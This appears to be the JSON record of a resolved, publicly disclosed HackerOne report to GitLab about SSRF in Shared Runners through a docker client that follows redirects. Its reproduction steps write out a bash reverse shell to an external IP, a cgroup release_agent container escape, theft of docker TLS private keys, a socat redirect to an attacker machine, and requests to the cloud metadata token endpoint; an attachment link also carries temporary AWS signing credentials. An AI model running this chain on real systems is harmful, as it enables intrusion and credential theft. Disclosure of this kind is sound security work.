@@ -1,0 +1,132 @@
+{
+  "id": 809248,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MDkyNDg=",
+  "url": "https://hackerone.com/reports/809248",
+  "title": "SSRF into Shared Runner, by replacing dockerd with malicious server in Executor",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-03-03T05:15:48.530Z",
+  "submitted_at": "2020-03-03T05:15:48.530Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lucash-dev",
+    "url": "/lucash-dev",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/515/399/dd4a50c732c98417d7be59efa049e8c234259884_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-09-08T13:28:39.515Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-10T20:12:45.207Z",
+  "team_member_agreed_on_going_public_at": "2020-09-08T13:28:39.323Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Note\n\nI've assigned the severity HIGH and submitted this report based on previously disclosed blind SSRF bugs that were previously disclosed.\n(https://hackerone.com/reports/398799)\nIf that's not correct, please adjust or let me know if you require more immediate impact on users in order to consider it.\n\n\n# Description\n\nThe Shared Runners implementation has a bug in its docker client\nthat allows following HTTP redirection. Because it accesses the\ndocker daemons running in executors -- which are completely under\ncontrol of users -- a malicious user can replace the existing\ndockerd with a malicious HTTPS server that sends redirect responses.\nThe TLS validation can't prevent this attack, as both public and\nprivate keys used by the docker daemon in the executor are also\nunder the CI job's (so the user's) control.\n\nAn attacker can use that to perform (mostly blind) SSRF attacks\ntargetting the Shared Runner local host, link-local and local networks.\nIn case of an error response from the target, the response body\nwill be displayed in the CI job's logs.\nA succcessful HTTP request will result in the first character of\nthe response being visible, or -- if the response is a valid JSON --\nwill cause the process to hang.\nTCP (other than HTTP) targets also partially reveal the response.\n\nThis can be used, for example to send requests to Google Cloud's metadata\nservice, but so far I've been unable to obtain the access token\n(only the first character `a` is visible).\n\nThe culprit seems to be \n`https://gitlab.com/gitlab-org/gitlab-runner/-/blob/master/helpers/docker/official_docker_client.go#L45`\n\nThe line `httpClient := &http.Client{Transport: transport}` seems to be missing a proper\nredirect policy.\n\n\n# Steps to reproduce\n\nThere are a number of steps to reproduce this issue the way I did.\nMost of them could be automated or simplified with further effort, but I think\nthe existing process can be followed relatively easily. Please let me know if you \nhave trouble with it.\n\n1 - Run a CI job and obtain a reverse shell into the Executor\n\nCreate a CI jobs that runs a command like \n```\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n```\n\nReplace the IP address with the address of an external machine you control.\n\nUse `nc -lvp 4444` to obtain the reverse shell from your machine.\n\n2 - Prepare root access to the Executor and mount host file system\n\nIn the shell, run the following commands:\n\n```\nmkdir /h ;\nmount /dev/sda9 /h;\nmkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x;\necho 1 > /tmp/cgrp/x/notify_on_release;\nexport host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`;\n echo \"$host_path/cmd\" > /tmp/cgrp/release_agent;\n```\n\nThis will both mount the host storage volume and prepare a cgroup trigger for running commands\nas root.\n\n3 - Obtain docker's certificate public and private keys\n\nRun these commands:\n\n```\ncat /h/etc/docker/server.pem\ncat /h/etc/docker/server-key.pem\n```\n\n4 - Set up a malicious HTTPS server in a machine you control\n\nCopy the text of `server.pem` and `server-key.pem` to the corresponding files in your attacker\nmachine.\n\nRun the attached `maliciousHttpsServer.py`.\n\nThis will start an HTTPS server that uses the certs in the provided `server.pem` and `server-key.pem`\nfiles. That way the Runner docker client has no way to tell it from the legitimate `dockerd`.\n\n\n5 - Obtain the PID that's listening to port 2376 (docker daemon)\n\nRun the following commands:\n```\necho '#!/bin/sh' > /cmd\necho \"sudo netstat -tanp > $host_path/n2\" >> /cmd\nchmod a+x /cmd\n  sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"\ncat /n2\n```\n\nTake note of the PID listening to 2376.\n\n\n6 - Kill the daemon and use `socat` to redirect IP packets to your\nexternal machine.\n\nNow we must send the traffic from the Executor to our attack box:\n\n```\necho '#!/bin/sh' > /cmd\necho \"sudo kill -9 999 && socat tcp-listen:2376,reuseaddr,fork tcp:1.2.3.4:1111 2> $host_path/k2\" >> /cmd\nchmod a+x /cmd\nsh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"\n```\nReplace `999` with the correct PID, and `1.2.3.4` with the IP of your attack box.\n\n7 - The external HTTPS now will redirect the Runner's Docker Client's\nrequests to the target.\n\nNow the connection flow we have is this\n\n```\n[Runner-client] --TLS--> [Executor] --Socat--> [Malicious-HTTPS-server] --Redirect--> [Runner-client] --HTTP--> Target\n\n```\n\nThe `maliciousHttpServer.py` script is configured to redirect GET requests to\n`http://metadata.google.internal:80/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=text\n\n(BTW the `v1beta1` endpoint is still working)\n\nThe same technique can be used to obtain SSRF with POST and DELETE requests.\n\n8 - Observe the response in the job's error logs.\n\nNow the Shared Runner will try to keep track of the running job, but it's HTTP requests\nwill end up hitting the metadata endpoint, so the response won't be valid.\nThe first letter of the response (`a` for `access_Token`) will show up in an error message\nwhen it's trying to parse the response.\n\n\n\n# What is the expected behavior\n\nThe Runner's docker client shouldn't trust the docker daemon, and\nshouldn't follow redirections from the docker REST API, much less\nredirections to local addresses.\n\n# What is the actual bug behavior\n\nThe Runner's docker client follows redirect responses sent by\nthe executor's docker daemon. \n\n\n# Impact\n\nThe issue described here allows an attacker to hit local host, local network, and link-local\naddresses within the Shared Runner, with GET, POST, DELETE HTTP(S) requests to arbitrary\nendpoints.\nThe request response can be partially obtained in case of a successful request, or completely\nobtained in case of an error response code.\n\nSince the Share Runners are shared between different projects/users and command the CI jobs\nfor these, the issue seems relevant.\n\nOther impacts that might be possibly obtained (though not tested as might cause disruption of\nservice) include:\n- Resource exhaustion through hanging jobs (when the HTTP response is a valid JSON).\n- Resource exhaustion by sending excessively large responses, in particular, using gzip\nencoding.\n\nI'm still actively researching ways of obtaining the full HTTP response, as well as other\ntarget endpoints, and will report in the comments further findings.\n\n## Impact\n\n# Impact\n\nThe issue described here allows an attacker to hit local host, local network, and link-local\naddresses within the Shared Runner, with GET, POST, DELETE HTTP(S) requests to arbitrary\nendpoints.\nThe request response can be partially obtained in case of a successful request, or completely\nobtained in case of an error response code.\n\nSince the Share Runners are shared between different projects/users and command the CI jobs\nfor these, the issue seems relevant.\n\nOther impacts that might be possibly obtained (though not tested as might cause disruption of\nservice) include:\n- Resource exhaustion through hanging jobs (when the HTTP response is a valid JSON).\n- Resource exhaustion by sending excessively large responses, in particular, using gzip\nencoding.\n\nI'm still actively researching ways of obtaining the full HTTP response, as well as other\ntarget endpoints, and will report in the comments further findings.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 735091,
+      "file_name": "maliciousHttpsServer.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2YJSameMWd27VVEjALhXjowN?response-content-disposition=attachment%3B%20filename%3D%22maliciousHttpsServer.py%22%3B%20filename%2A%3DUTF-8%27%27maliciousHttpsServer.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVKDNKVHF%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T174829Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJHMEUCIDeSk1tdQ0EV3NNua5tLDSO10HWwtrDzJIFGbGDv45qqAiEA8ovGoh2x438CxGpv3O6IeOJbCGkBPGZvAQOwc4NN2oEqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDHIyQ%2BzYoQtkBCJdFCqOBVHLkq%2BsTaFu%2F%2BspTWsljX8iSkoVLzBM3raEyuv6osJZuGJD6TXpW9cNAorpX4lerrUeM%2Bfii%2BEiE5Uq%2FgiRThMwfwmYGyrxl9jUDtbdjiftivpFf6AhOtK4UZN5HiDYCLl%2B2OUgrExdyWYwO%2F%2Bv71kp3ZWnPQJoPsARE5mkuCsiHWPPsAY82hRK3AOBBX6cv6IBNOadNxGpo42csBkSlaMfpF0tquNtoUhaOvHYO%2BGK7zrRqYDUjyzhIAYCdWnx%2BQkAAdSH60utwW%2FvCy6iIIMcotwCojVHqRGJfB4a%2BUpg%2FeBGIhe62Qj1QRso1CyYyLLQC%2BFyDzfUH%2BJWEwcFqDVPaD0XpQygIL68weUOP%2FsHRjPWf5BiMSLo89ltrZjH0QaNAMVanDTZm3zzdeOUjEiRNo6u4M7atsrajV6C1%2Bxua4EnkpRj%2F1JS1OHFSUBGnXjjZO8%2BQ%2FWcpyPsluLOEOU%2BOXWbiVDW0pDAXjyCHNYNzylQhGipdd1wZmaNnEtd0DltmEeJEet7NP7Yom3T0CdJGoGlpLhtxWMBXhJnTRwVenQqpWJ7%2BgO54LlTltUciDDFT%2By%2FQV01QIybVo1anYuS9C8AdlkVFuyMFaN%2BbpSm%2BDSJxKmWQsRPeR52Ejof5%2BAfxzY5ZIYCUqKEIvcZIIWFL4Vwa4Vh7n1t27SA4qe3pZspJqxnrkLb3ToQsizgvCh0b%2F%2BoAZsSPLfIMTvB6xCHv%2B7KE496dTtUYIAwQcwej41gHRcLzXVGtNPSd3wjG8kF1JLoinxPUwyOebMERLnJrM21QbiltsmNOP46f9cdmeJnlUOF8BOVU9N%2BmRkNc4kXomMqtIz5CebmgfHGoPipGvRJpp9mBMg5NFDf%2FDCootjPBjqxAZW6n%2FuqrSboRJ9GHNWx5NU3D%2Fg3rqjIuwOa2W9%2FhTINATzu1CHPUl73UOT2pr3gK863B0s%2BTcCMXA%2BTqGJPcDgCUnrrd%2FewFfQ6U0yYVvDlDYFiia%2BesKZ%2FB1tqgJCulrjDDJEvm%2FVqZXQL%2F1aMqpvHAw3q5e5K0%2FF8COE8T6Wdb4vGnWOcaFEifJzNFe7V1UJ4z0ZsguYXDE1eI%2F1k0Eik8XiuWuyEMf7jnTjgoIWRLQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a6bbdf06ab38aa38766360c1c597b64f57084720b94037b60f447feac5bc19c0",
+      "file_size": 717,
+      "type": "text/x-python",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 12,
+  "voters": [
+    "an40r1",
+    "n1m0",
+    "p1stachios",
+    "base_64",
+    "7odamoo",
+    "ali",
+    "hulkvision_",
+    "eye_",
+    "ret2c",
+    "einsamerwolf",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 18138,
+    "asset_type": "URL",
+    "asset_identifier": "gitlab.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
